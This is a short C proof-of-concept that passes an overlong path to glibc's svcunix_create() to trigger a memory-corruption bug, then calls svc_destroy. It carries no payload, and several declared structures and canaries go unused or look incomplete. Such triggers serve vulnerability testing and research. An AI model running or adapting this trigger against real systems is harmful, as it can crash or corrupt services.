#include <stdio.h>
#include <string.h>
#include <rpc/rpc.h>
#include <rpc/svc.h>
#include <sys/un.h>
#include <errno.h>


int main() {
    struct netconfig config;
    struct t_bind bind_addr;
    struct sockaddr_un addr;

    // Fill netconfig with dummy values
    memset(&config, 0, sizeof(config));
    config.nc_device = "/dev/null";  // dummy

    // Create an overly long path (> 108 bytes for AF_UNIX)
    char canary_before[16] = "CANARYBEFORE123";
    char long_path[1000];
    char canary_after[16] = "CANARYAFTER12345";
    memset(long_path, 'A', sizeof(long_path) - 1);
    long_path[sizeof(long_path) - 1] = '\0';

    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, long_path, sizeof(addr.sun_path));

    bind_addr.addr.maxlen = sizeof(addr);
    bind_addr.addr.len = sizeof(addr);
    bind_addr.addr.buf = (char *)&addr;

    // This call triggers the vulnerability on vulnerable versions of glibc
    SVCXPRT *xprt = svcunix_create(RPC_ANYSOCK, 0, 0, long_path);

    if (!xprt) {
        perror("svcunix_create failed");
        printf("errno: %d\n", errno);
    } else {
        printf("svcunix_create succeeded (unexpected on patched systems)\n");
        // Do something with xprt to trigger use of corrupted data
        svc_destroy(xprt);

        printf("svc_destroy called\n");
    }

    return 0;
}
